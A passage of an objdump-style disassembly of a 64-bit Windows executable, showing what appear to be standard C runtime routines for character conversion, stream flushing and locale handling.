   140009673:	48 8b 0d 7e ad 00 00 	mov    0xad7e(%rip),%rcx        # 0x1400143f8
   14000967a:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   14000967e:	0f 84 b9 00 00 00    	je     0x14000973d
   140009684:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000968a:	4c 8d 4c 24 44       	lea    0x44(%rsp),%r9
   14000968f:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140009694:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000969a:	ff 15 c8 49 00 00    	call   *0x49c8(%rip)        # 0x14000e068
   1400096a0:	85 c0                	test   %eax,%eax
   1400096a2:	0f 85 89 00 00 00    	jne    0x140009731
   1400096a8:	83 3d 71 ac 00 00 02 	cmpl   $0x2,0xac71(%rip)        # 0x140014320
   1400096af:	0f 85 88 00 00 00    	jne    0x14000973d
   1400096b5:	ff 15 95 49 00 00    	call   *0x4995(%rip)        # 0x14000e050
   1400096bb:	83 f8 78             	cmp    $0x78,%eax
   1400096be:	75 7d                	jne    0x14000973d
   1400096c0:	83 25 59 ac 00 00 00 	andl   $0x0,0xac59(%rip)        # 0x140014320
   1400096c7:	ff 15 a3 49 00 00    	call   *0x49a3(%rip)        # 0x14000e070
   1400096cd:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   1400096d3:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   1400096d9:	8b c8                	mov    %eax,%ecx
   1400096db:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   1400096e0:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   1400096e5:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   1400096eb:	33 d2                	xor    %edx,%edx
   1400096ed:	c7 44 24 28 05 00 00 	movl   $0x5,0x28(%rsp)
   1400096f4:	00 
   1400096f5:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400096fa:	ff 15 f8 4a 00 00    	call   *0x4af8(%rip)        # 0x14000e1f8
   140009700:	48 8b 0d f1 ac 00 00 	mov    0xacf1(%rip),%rcx        # 0x1400143f8
   140009707:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   14000970b:	74 30                	je     0x14000973d
   14000970d:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140009713:	4c 8d 4c 24 44       	lea    0x44(%rsp),%r9
   140009718:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   14000971d:	44 8b c0             	mov    %eax,%r8d
   140009720:	ff 15 52 49 00 00    	call   *0x4952(%rip)        # 0x14000e078
   140009726:	85 c0                	test   %eax,%eax
   140009728:	74 13                	je     0x14000973d
   14000972a:	66 8b 44 24 40       	mov    0x40(%rsp),%ax
   14000972f:	eb 11                	jmp    0x140009742
   140009731:	c7 05 e5 ab 00 00 01 	movl   $0x1,0xabe5(%rip)        # 0x140014320
   140009738:	00 00 00 
   14000973b:	eb ed                	jmp    0x14000972a
   14000973d:	b8 ff ff 00 00       	mov    $0xffff,%eax
   140009742:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140009747:	48 33 cc             	xor    %rsp,%rcx
   14000974a:	e8 f1 82 ff ff       	call   0x140001a40
   14000974f:	48 83 c4 68          	add    $0x68,%rsp
   140009753:	c3                   	ret
   140009754:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009759:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000975e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140009763:	57                   	push   %rdi
   140009764:	48 83 ec 50          	sub    $0x50,%rsp
   140009768:	33 ed                	xor    %ebp,%ebp
   14000976a:	49 8b f0             	mov    %r8,%rsi
   14000976d:	48 8b fa             	mov    %rdx,%rdi
   140009770:	48 8b d9             	mov    %rcx,%rbx
   140009773:	48 3b d5             	cmp    %rbp,%rdx
   140009776:	74 12                	je     0x14000978a
   140009778:	4c 3b c5             	cmp    %rbp,%r8
   14000977b:	74 0d                	je     0x14000978a
   14000977d:	40 38 2a             	cmp    %bpl,(%rdx)
   140009780:	75 1f                	jne    0x1400097a1
   140009782:	48 3b cd             	cmp    %rbp,%rcx
   140009785:	74 03                	je     0x14000978a
   140009787:	66 89 29             	mov    %bp,(%rcx)
   14000978a:	33 c0                	xor    %eax,%eax
   14000978c:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140009791:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140009796:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   14000979b:	48 83 c4 50          	add    $0x50,%rsp
   14000979f:	5f                   	pop    %rdi
   1400097a0:	c3                   	ret
   1400097a1:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400097a6:	49 8b d1             	mov    %r9,%rdx
   1400097a9:	e8 d2 ae ff ff       	call   0x140004680
   1400097ae:	4c 8b 5c 24 30       	mov    0x30(%rsp),%r11
   1400097b3:	41 39 6b 14          	cmp    %ebp,0x14(%r11)
   1400097b7:	75 25                	jne    0x1400097de
   1400097b9:	48 3b dd             	cmp    %rbp,%rbx
   1400097bc:	74 06                	je     0x1400097c4
   1400097be:	0f b6 07             	movzbl (%rdi),%eax
   1400097c1:	66 89 03             	mov    %ax,(%rbx)
   1400097c4:	40 38 6c 24 48       	cmp    %bpl,0x48(%rsp)
   1400097c9:	74 0c                	je     0x1400097d7
   1400097cb:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   1400097d0:	83 a0 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rax)
   1400097d7:	b8 01 00 00 00       	mov    $0x1,%eax
   1400097dc:	eb ae                	jmp    0x14000978c
   1400097de:	0f b6 0f             	movzbl (%rdi),%ecx
   1400097e1:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400097e6:	e8 61 e6 ff ff       	call   0x140007e4c
   1400097eb:	3b c5                	cmp    %ebp,%eax
   1400097ed:	0f 84 9c 00 00 00    	je     0x14000988f
   1400097f3:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1400097f8:	44 8b 89 0c 01 00 00 	mov    0x10c(%rcx),%r9d
   1400097ff:	41 83 f9 01          	cmp    $0x1,%r9d
   140009803:	7e 30                	jle    0x140009835
   140009805:	41 3b f1             	cmp    %r9d,%esi
   140009808:	7c 2b                	jl     0x140009835
   14000980a:	8b 49 04             	mov    0x4(%rcx),%ecx
   14000980d:	8b c5                	mov    %ebp,%eax
   14000980f:	48 3b dd             	cmp    %rbp,%rbx
   140009812:	0f 95 c0             	setne  %al
   140009815:	4c 8b c7             	mov    %rdi,%r8
   140009818:	ba 09 00 00 00       	mov    $0x9,%edx
   14000981d:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140009821:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140009826:	ff 15 74 48 00 00    	call   *0x4874(%rip)        # 0x14000e0a0
   14000982c:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140009831:	3b c5                	cmp    %ebp,%eax
   140009833:	75 12                	jne    0x140009847
   140009835:	48 63 81 0c 01 00 00 	movslq 0x10c(%rcx),%rax
   14000983c:	48 3b f0             	cmp    %rax,%rsi
   14000983f:	72 28                	jb     0x140009869
   140009841:	40 38 6f 01          	cmp    %bpl,0x1(%rdi)
   140009845:	74 22                	je     0x140009869
   140009847:	8b 81 0c 01 00 00    	mov    0x10c(%rcx),%eax
   14000984d:	40 38 6c 24 48       	cmp    %bpl,0x48(%rsp)
   140009852:	0f 84 34 ff ff ff    	je     0x14000978c
   140009858:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   14000985d:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   140009864:	e9 23 ff ff ff       	jmp    0x14000978c
   140009869:	e8 36 98 ff ff       	call   0x1400030a4
   14000986e:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   140009874:	40 38 6c 24 48       	cmp    %bpl,0x48(%rsp)
   140009879:	74 0c                	je     0x140009887
   14000987b:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140009880:	83 a0 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rax)
   140009887:	83 c8 ff             	or     $0xffffffff,%eax
   14000988a:	e9 fd fe ff ff       	jmp    0x14000978c
   14000988f:	8b c5                	mov    %ebp,%eax
   140009891:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140009897:	48 3b dd             	cmp    %rbp,%rbx
   14000989a:	0f 95 c0             	setne  %al
   14000989d:	41 8d 51 08          	lea    0x8(%r9),%edx
   1400098a1:	4c 8b c7             	mov    %rdi,%r8
   1400098a4:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400098a8:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   1400098ad:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400098b2:	8b 48 04             	mov    0x4(%rax),%ecx
   1400098b5:	ff 15 e5 47 00 00    	call   *0x47e5(%rip)        # 0x14000e0a0
   1400098bb:	3b c5                	cmp    %ebp,%eax
   1400098bd:	0f 85 01 ff ff ff    	jne    0x1400097c4
   1400098c3:	eb a4                	jmp    0x140009869
   1400098c5:	cc                   	int3
   1400098c6:	cc                   	int3
   1400098c7:	cc                   	int3
   1400098c8:	45 33 c9             	xor    %r9d,%r9d
   1400098cb:	e9 84 fe ff ff       	jmp    0x140009754
   1400098d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400098d5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400098da:	41 54                	push   %r12
   1400098dc:	48 83 ec 30          	sub    $0x30,%rsp
   1400098e0:	33 f6                	xor    %esi,%esi
   1400098e2:	8d 4e 01             	lea    0x1(%rsi),%ecx
   1400098e5:	e8 82 a3 ff ff       	call   0x140003c6c
   1400098ea:	90                   	nop
   1400098eb:	8d 5e 03             	lea    0x3(%rsi),%ebx
   1400098ee:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   1400098f2:	3b 1d 68 cc 00 00    	cmp    0xcc68(%rip),%ebx        # 0x140016560
   1400098f8:	7d 69                	jge    0x140009963
   1400098fa:	4c 63 e3             	movslq %ebx,%r12
   1400098fd:	48 8b 05 3c bc 00 00 	mov    0xbc3c(%rip),%rax        # 0x140015540
   140009904:	4a 83 3c e0 00       	cmpq   $0x0,(%rax,%r12,8)
   140009909:	74 50                	je     0x14000995b
   14000990b:	4a 8b 0c e0          	mov    (%rax,%r12,8),%rcx
   14000990f:	f6 41 18 83          	testb  $0x83,0x18(%rcx)
   140009913:	74 10                	je     0x140009925
   140009915:	e8 0a 06 00 00       	call   0x140009f24
   14000991a:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000991d:	74 06                	je     0x140009925
   14000991f:	ff c6                	inc    %esi
   140009921:	89 74 24 24          	mov    %esi,0x24(%rsp)
   140009925:	83 fb 14             	cmp    $0x14,%ebx
   140009928:	7c 31                	jl     0x14000995b
   14000992a:	48 8b 05 0f bc 00 00 	mov    0xbc0f(%rip),%rax        # 0x140015540
   140009931:	4a 8b 0c e0          	mov    (%rax,%r12,8),%rcx
   140009935:	48 83 c1 30          	add    $0x30,%rcx
   140009939:	ff 15 79 48 00 00    	call   *0x4879(%rip)        # 0x14000e1b8
   14000993f:	48 8b 0d fa bb 00 00 	mov    0xbbfa(%rip),%rcx        # 0x140015540
   140009946:	4a 8b 0c e1          	mov    (%rcx,%r12,8),%rcx
   14000994a:	e8 c9 90 ff ff       	call   0x140002a18
   14000994f:	4c 8b 1d ea bb 00 00 	mov    0xbbea(%rip),%r11        # 0x140015540
   140009956:	4b 83 24 e3 00       	andq   $0x0,(%r11,%r12,8)
   14000995b:	ff c3                	inc    %ebx
   14000995d:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140009961:	eb 8f                	jmp    0x1400098f2
   140009963:	b9 01 00 00 00       	mov    $0x1,%ecx
   140009968:	e8 ff a1 ff ff       	call   0x140003b6c
   14000996d:	8b c6                	mov    %esi,%eax
   14000996f:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140009974:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140009979:	48 83 c4 30          	add    $0x30,%rsp
   14000997d:	41 5c                	pop    %r12
   14000997f:	c3                   	ret
   140009980:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009985:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000998a:	57                   	push   %rdi
   14000998b:	48 83 ec 20          	sub    $0x20,%rsp
   14000998f:	8b 41 18             	mov    0x18(%rcx),%eax
   140009992:	33 f6                	xor    %esi,%esi
   140009994:	48 8b d9             	mov    %rcx,%rbx
   140009997:	24 03                	and    $0x3,%al
   140009999:	3c 02                	cmp    $0x2,%al
   14000999b:	75 3f                	jne    0x1400099dc
   14000999d:	f7 41 18 08 01 00 00 	testl  $0x108,0x18(%rcx)
   1400099a4:	74 36                	je     0x1400099dc
   1400099a6:	8b 39                	mov    (%rcx),%edi
   1400099a8:	2b 79 10             	sub    0x10(%rcx),%edi
   1400099ab:	85 ff                	test   %edi,%edi
   1400099ad:	7e 2d                	jle    0x1400099dc
   1400099af:	e8 60 e4 ff ff       	call   0x140007e14
   1400099b4:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   1400099b8:	44 8b c7             	mov    %edi,%r8d
   1400099bb:	8b c8                	mov    %eax,%ecx
   1400099bd:	e8 36 e0 ff ff       	call   0x1400079f8
   1400099c2:	3b c7                	cmp    %edi,%eax
   1400099c4:	75 0f                	jne    0x1400099d5
   1400099c6:	8b 43 18             	mov    0x18(%rbx),%eax
   1400099c9:	84 c0                	test   %al,%al
   1400099cb:	79 0f                	jns    0x1400099dc
   1400099cd:	83 e0 fd             	and    $0xfffffffd,%eax
   1400099d0:	89 43 18             	mov    %eax,0x18(%rbx)
   1400099d3:	eb 07                	jmp    0x1400099dc
   1400099d5:	83 4b 18 20          	orl    $0x20,0x18(%rbx)
   1400099d9:	83 ce ff             	or     $0xffffffff,%esi
   1400099dc:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   1400099e0:	83 63 08 00          	andl   $0x0,0x8(%rbx)
   1400099e4:	8b c6                	mov    %esi,%eax
   1400099e6:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400099eb:	48 89 0b             	mov    %rcx,(%rbx)
   1400099ee:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400099f3:	48 83 c4 20          	add    $0x20,%rsp
   1400099f7:	5f                   	pop    %rdi
   1400099f8:	c3                   	ret
   1400099f9:	cc                   	int3
   1400099fa:	cc                   	int3
   1400099fb:	cc                   	int3
   1400099fc:	40 53                	rex push %rbx
   1400099fe:	48 83 ec 20          	sub    $0x20,%rsp
   140009a02:	48 8b d9             	mov    %rcx,%rbx
   140009a05:	48 85 c9             	test   %rcx,%rcx
   140009a08:	75 07                	jne    0x140009a11
   140009a0a:	e8 35 00 00 00       	call   0x140009a44
   140009a0f:	eb 2c                	jmp    0x140009a3d
   140009a11:	e8 6a ff ff ff       	call   0x140009980
   140009a16:	85 c0                	test   %eax,%eax
   140009a18:	74 05                	je     0x140009a1f
   140009a1a:	83 c8 ff             	or     $0xffffffff,%eax
   140009a1d:	eb 1e                	jmp    0x140009a3d
   140009a1f:	0f ba 63 18 0e       	btl    $0xe,0x18(%rbx)
   140009a24:	73 15                	jae    0x140009a3b
   140009a26:	48 8b cb             	mov    %rbx,%rcx
   140009a29:	e8 e6 e3 ff ff       	call   0x140007e14
   140009a2e:	8b c8                	mov    %eax,%ecx
   140009a30:	e8 67 05 00 00       	call   0x140009f9c
   140009a35:	f7 d8                	neg    %eax
   140009a37:	1b c0                	sbb    %eax,%eax
   140009a39:	eb 02                	jmp    0x140009a3d
   140009a3b:	33 c0                	xor    %eax,%eax
   140009a3d:	48 83 c4 20          	add    $0x20,%rsp
   140009a41:	5b                   	pop    %rbx
   140009a42:	c3                   	ret
   140009a43:	cc                   	int3
   140009a44:	48 89 74 24 08       	mov    %rsi,0x8(%rsp)
   140009a49:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   140009a4e:	4c 89 64 24 18       	mov    %r12,0x18(%rsp)
   140009a53:	41 55                	push   %r13
   140009a55:	41 56                	push   %r14
   140009a57:	41 57                	push   %r15
   140009a59:	48 83 ec 30          	sub    $0x30,%rsp
   140009a5d:	44 8b f1             	mov    %ecx,%r14d
   140009a60:	45 33 e4             	xor    %r12d,%r12d
   140009a63:	33 f6                	xor    %esi,%esi
   140009a65:	8d 4e 01             	lea    0x1(%rsi),%ecx
   140009a68:	e8 ff a1 ff ff       	call   0x140003c6c
   140009a6d:	90                   	nop
   140009a6e:	33 ff                	xor    %edi,%edi
   140009a70:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   140009a74:	41 83 cf ff          	or     $0xffffffff,%r15d
   140009a78:	3b 3d e2 ca 00 00    	cmp    0xcae2(%rip),%edi        # 0x140016560
   140009a7e:	0f 8d 86 00 00 00    	jge    0x140009b0a
   140009a84:	4c 63 ef             	movslq %edi,%r13
   140009a87:	48 8b 05 b2 ba 00 00 	mov    0xbab2(%rip),%rax        # 0x140015540
   140009a8e:	4a 83 3c e8 00       	cmpq   $0x0,(%rax,%r13,8)
   140009a93:	74 6a                	je     0x140009aff
   140009a95:	4a 8b 14 e8          	mov    (%rax,%r13,8),%rdx
   140009a99:	f6 42 18 83          	testb  $0x83,0x18(%rdx)
   140009a9d:	74 60                	je     0x140009aff
   140009a9f:	8b cf                	mov    %edi,%ecx
   140009aa1:	e8 be e2 ff ff       	call   0x140007d64
   140009aa6:	90                   	nop
   140009aa7:	48 8b 05 92 ba 00 00 	mov    0xba92(%rip),%rax        # 0x140015540
   140009aae:	4a 8b 0c e8          	mov    (%rax,%r13,8),%rcx
   140009ab2:	f6 41 18 83          	testb  $0x83,0x18(%rcx)
   140009ab6:	74 35                	je     0x140009aed
   140009ab8:	41 83 fe 01          	cmp    $0x1,%r14d
   140009abc:	75 14                	jne    0x140009ad2
   140009abe:	e8 39 ff ff ff       	call   0x1400099fc
   140009ac3:	41 3b c7             	cmp    %r15d,%eax
   140009ac6:	74 25                	je     0x140009aed
   140009ac8:	41 ff c4             	inc    %r12d
   140009acb:	44 89 64 24 24       	mov    %r12d,0x24(%rsp)
   140009ad0:	eb 1b                	jmp    0x140009aed
   140009ad2:	45 85 f6             	test   %r14d,%r14d
   140009ad5:	75 16                	jne    0x140009aed
   140009ad7:	f6 41 18 02          	testb  $0x2,0x18(%rcx)
   140009adb:	74 10                	je     0x140009aed
   140009add:	e8 1a ff ff ff       	call   0x1400099fc
   140009ae2:	41 3b c7             	cmp    %r15d,%eax
   140009ae5:	41 0f 44 f7          	cmove  %r15d,%esi
   140009ae9:	89 74 24 28          	mov    %esi,0x28(%rsp)
   140009aed:	48 8b 15 4c ba 00 00 	mov    0xba4c(%rip),%rdx        # 0x140015540
   140009af4:	4a 8b 14 ea          	mov    (%rdx,%r13,8),%rdx
   140009af8:	8b cf                	mov    %edi,%ecx
   140009afa:	e8 ed e2 ff ff       	call   0x140007dec
   140009aff:	ff c7                	inc    %edi
   140009b01:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   140009b05:	e9 6e ff ff ff       	jmp    0x140009a78
   140009b0a:	b9 01 00 00 00       	mov    $0x1,%ecx
   140009b0f:	e8 58 a0 ff ff       	call   0x140003b6c
   140009b14:	41 83 fe 01          	cmp    $0x1,%r14d
   140009b18:	41 0f 44 f4          	cmove  %r12d,%esi
   140009b1c:	8b c6                	mov    %esi,%eax
   140009b1e:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140009b23:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140009b28:	4c 8b 64 24 60       	mov    0x60(%rsp),%r12
   140009b2d:	48 83 c4 30          	add    $0x30,%rsp
   140009b31:	41 5f                	pop    %r15
   140009b33:	41 5e                	pop    %r14
   140009b35:	41 5d                	pop    %r13
   140009b37:	c3                   	ret
   140009b38:	b9 01 00 00 00       	mov    $0x1,%ecx
   140009b3d:	e9 02 ff ff ff       	jmp    0x140009a44
   140009b42:	cc                   	int3
   140009b43:	cc                   	int3
   140009b44:	48 83 ec 38          	sub    $0x38,%rsp
   140009b48:	48 8b 05 f9 94 00 00 	mov    0x94f9(%rip),%rax        # 0x140013048
   140009b4f:	48 33 c4             	xor    %rsp,%rax
   140009b52:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140009b57:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   140009b5c:	41 b9 06 00 00 00    	mov    $0x6,%r9d
   140009b62:	ba 04 10 00 00       	mov    $0x1004,%edx
   140009b67:	c6 44 24 26 00       	movb   $0x0,0x26(%rsp)
   140009b6c:	ff 15 f6 46 00 00    	call   *0x46f6(%rip)        # 0x14000e268
   140009b72:	85 c0                	test   %eax,%eax
   140009b74:	75 05                	jne    0x140009b7b
   140009b76:	83 c8 ff             	or     $0xffffffff,%eax
   140009b79:	eb 0a                	jmp    0x140009b85
   140009b7b:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140009b80:	e8 d7 e8 ff ff       	call   0x14000845c
   140009b85:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140009b8a:	48 33 cc             	xor    %rsp,%rcx
   140009b8d:	e8 ae 7e ff ff       	call   0x140001a40
   140009b92:	48 83 c4 38          	add    $0x38,%rsp
   140009b96:	c3                   	ret
   140009b97:	cc                   	int3
   140009b98:	40 55                	rex push %rbp
   140009b9a:	53                   	push   %rbx
   140009b9b:	56                   	push   %rsi
   140009b9c:	57                   	push   %rdi
   140009b9d:	41 54                	push   %r12
   140009b9f:	41 55                	push   %r13
   140009ba1:	41 56                	push   %r14
   140009ba3:	41 57                	push   %r15
   140009ba5:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   140009bac:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   140009bb1:	48 8b 05 90 94 00 00 	mov    0x9490(%rip),%rax        # 0x140013048
   140009bb8:	48 33 c5             	xor    %rbp,%rax
   140009bbb:	48 89 45 30          	mov    %rax,0x30(%rbp)
   140009bbf:	4c 8b b5 b0 00 00 00 	mov    0xb0(%rbp),%r14
   140009bc6:	45 8b 21             	mov    (%r9),%r12d
   140009bc9:	33 ff                	xor    %edi,%edi
   140009bcb:	49 8b d8             	mov    %r8,%rbx
   140009bce:	48 8b f7             	mov    %rdi,%rsi
   140009bd1:	89 7d 00             	mov    %edi,0x0(%rbp)
   140009bd4:	4c 89 4d 10          	mov    %r9,0x10(%rbp)
   140009bd8:	44 8b ea             	mov    %edx,%r13d
   140009bdb:	44 8b f9             	mov    %ecx,%r15d
   140009bde:	48 89 5d 08          	mov    %rbx,0x8(%rbp)
   140009be2:	3b ca                	cmp    %edx,%ecx
   140009be4:	0f 84 13 02 00 00    	je     0x140009dfd
   140009bea:	48 8d 55 18          	lea    0x18(%rbp),%rdx
   140009bee:	ff 15 54 46 00 00    	call   *0x4654(%rip)        # 0x14000e248
   140009bf4:	3b c7                	cmp    %edi,%eax
   140009bf6:	0f 84 9f 00 00 00    	je     0x140009c9b
   140009bfc:	83 7d 18 01          	cmpl   $0x1,0x18(%rbp)
   140009c00:	0f 85 95 00 00 00    	jne    0x140009c9b
   140009c06:	48 8d 55 18          	lea    0x18(%rbp),%rdx
   140009c0a:	41 8b cd             	mov    %r13d,%ecx
   140009c0d:	ff 15 35 46 00 00    	call   *0x4635(%rip)        # 0x14000e248
   140009c13:	3b c7                	cmp    %edi,%eax
   140009c15:	0f 84 80 00 00 00    	je     0x140009c9b
   140009c1b:	83 7d 18 01          	cmpl   $0x1,0x18(%rbp)
   140009c1f:	75 7a                	jne    0x140009c9b
   140009c21:	c7 45 00 01 00 00 00 	movl   $0x1,0x0(%rbp)
   140009c28:	41 83 fc ff          	cmp    $0xffffffff,%r12d
   140009c2c:	74 60                	je     0x140009c8e
   140009c2e:	41 8b fc             	mov    %r12d,%edi
   140009c31:	85 ff                	test   %edi,%edi
   140009c33:	0f 8e a9 00 00 00    	jle    0x140009ce2
   140009c39:	48 63 cf             	movslq %edi,%rcx
   140009c3c:	48 b8 f0 ff ff ff ff 	movabs $0x7ffffffffffffff0,%rax
   140009c43:	ff ff 7f 
   140009c46:	48 3b c8             	cmp    %rax,%rcx
   140009c49:	0f 87 93 00 00 00    	ja     0x140009ce2
   140009c4f:	48 8d 4c 09 10       	lea    0x10(%rcx,%rcx,1),%rcx
   140009c54:	48 81 f9 00 04 00 00 	cmp    $0x400,%rcx
   140009c5b:	77 6c                	ja     0x140009cc9
   140009c5d:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   140009c61:	48 3b c1             	cmp    %rcx,%rax
   140009c64:	77 0a                	ja     0x140009c70
   140009c66:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   140009c6d:	ff ff 0f 
   140009c70:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   140009c74:	e8 27 26 00 00       	call   0x14000c2a0
   140009c79:	48 2b e0             	sub    %rax,%rsp
   140009c7c:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   140009c81:	48 85 db             	test   %rbx,%rbx
   140009c84:	74 3c                	je     0x140009cc2
   140009c86:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   140009c8c:	eb 4e                	jmp    0x140009cdc
   140009c8e:	48 8b cb             	mov    %rbx,%rcx
   140009c91:	e8 da 8c ff ff       	call   0x140002970
   140009c96:	8d 78 01             	lea    0x1(%rax),%edi
   140009c99:	eb 96                	jmp    0x140009c31
   140009c9b:	45 8b cc             	mov    %r12d,%r9d
   140009c9e:	4c 8b c3             	mov    %rbx,%r8
   140009ca1:	ba 01 00 00 00       	mov    $0x1,%edx
   140009ca6:	41 8b cf             	mov    %r15d,%ecx
   140009ca9:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   140009cad:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140009cb2:	ff 15 e8 43 00 00    	call   *0x43e8(%rip)        # 0x14000e0a0
   140009cb8:	8b f8                	mov    %eax,%edi
   140009cba:	85 c0                	test   %eax,%eax
   140009cbc:	0f 85 6f ff ff ff    	jne    0x140009c31
   140009cc2:	33 c0                	xor    %eax,%eax
   140009cc4:	e9 37 01 00 00       	jmp    0x140009e00
   140009cc9:	e8 d2 8b ff ff       	call   0x1400028a0
   140009cce:	48 8b d8             	mov    %rax,%rbx
   140009cd1:	48 85 c0             	test   %rax,%rax
   140009cd4:	74 0e                	je     0x140009ce4
   140009cd6:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   140009cdc:	48 83 c3 10          	add    $0x10,%rbx
   140009ce0:	eb 02                	jmp    0x140009ce4
   140009ce2:	33 db                	xor    %ebx,%ebx
   140009ce4:	48 85 db             	test   %rbx,%rbx
   140009ce7:	74 d9                	je     0x140009cc2
   140009ce9:	4c 63 c7             	movslq %edi,%r8
   140009cec:	33 d2                	xor    %edx,%edx
   140009cee:	48 8b cb             	mov    %rbx,%rcx
   140009cf1:	4d 03 c0             	add    %r8,%r8
   140009cf4:	e8 77 8d ff ff       	call   0x140002a70
   140009cf9:	4c 8b 45 08          	mov    0x8(%rbp),%r8
   140009cfd:	45 8b cc             	mov    %r12d,%r9d
   140009d00:	ba 01 00 00 00       	mov    $0x1,%edx
   140009d05:	41 8b cf             	mov    %r15d,%ecx
   140009d08:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   140009d0c:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140009d11:	ff 15 89 43 00 00    	call   *0x4389(%rip)        # 0x14000e0a0
   140009d17:	45 33 ff             	xor    %r15d,%r15d
   140009d1a:	41 3b c7             	cmp    %r15d,%eax
   140009d1d:	0f 84 c9 00 00 00    	je     0x140009dec
   140009d23:	4d 3b f7             	cmp    %r15,%r14
   140009d26:	74 3b                	je     0x140009d63
   140009d28:	8b 85 b8 00 00 00    	mov    0xb8(%rbp),%eax
   140009d2e:	4c 89 7c 24 38       	mov    %r15,0x38(%rsp)
   140009d33:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   140009d38:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140009d3c:	44 8b cf             	mov    %edi,%r9d
   140009d3f:	4c 8b c3             	mov    %rbx,%r8
   140009d42:	33 d2                	xor    %edx,%edx
   140009d44:	41 8b cd             	mov    %r13d,%ecx
   140009d47:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140009d4c:	ff 15 a6 44 00 00    	call   *0x44a6(%rip)        # 0x14000e1f8
   140009d52:	41 3b c7             	cmp    %r15d,%eax
   140009d55:	0f 84 91 00 00 00    	je     0x140009dec
   140009d5b:	49 8b f6             	mov    %r14,%rsi
   140009d5e:	e9 89 00 00 00       	jmp    0x140009dec
   140009d63:	44 39 7d 00          	cmp    %r15d,0x0(%rbp)
   140009d67:	75 2c                	jne    0x140009d95
   140009d69:	4c 89 7c 24 38       	mov    %r15,0x38(%rsp)
   140009d6e:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   140009d73:	44 8b cf             	mov    %edi,%r9d
   140009d76:	4c 8b c3             	mov    %rbx,%r8
   140009d79:	33 d2                	xor    %edx,%edx
   140009d7b:	41 8b cd             	mov    %r13d,%ecx
   140009d7e:	44 89 7c 24 28       	mov    %r15d,0x28(%rsp)
   140009d83:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140009d88:	ff 15 6a 44 00 00    	call   *0x446a(%rip)        # 0x14000e1f8
   140009d8e:	8b f8                	mov    %eax,%edi
   140009d90:	41 3b c7             	cmp    %r15d,%eax
   140009d93:	74 57                	je     0x140009dec
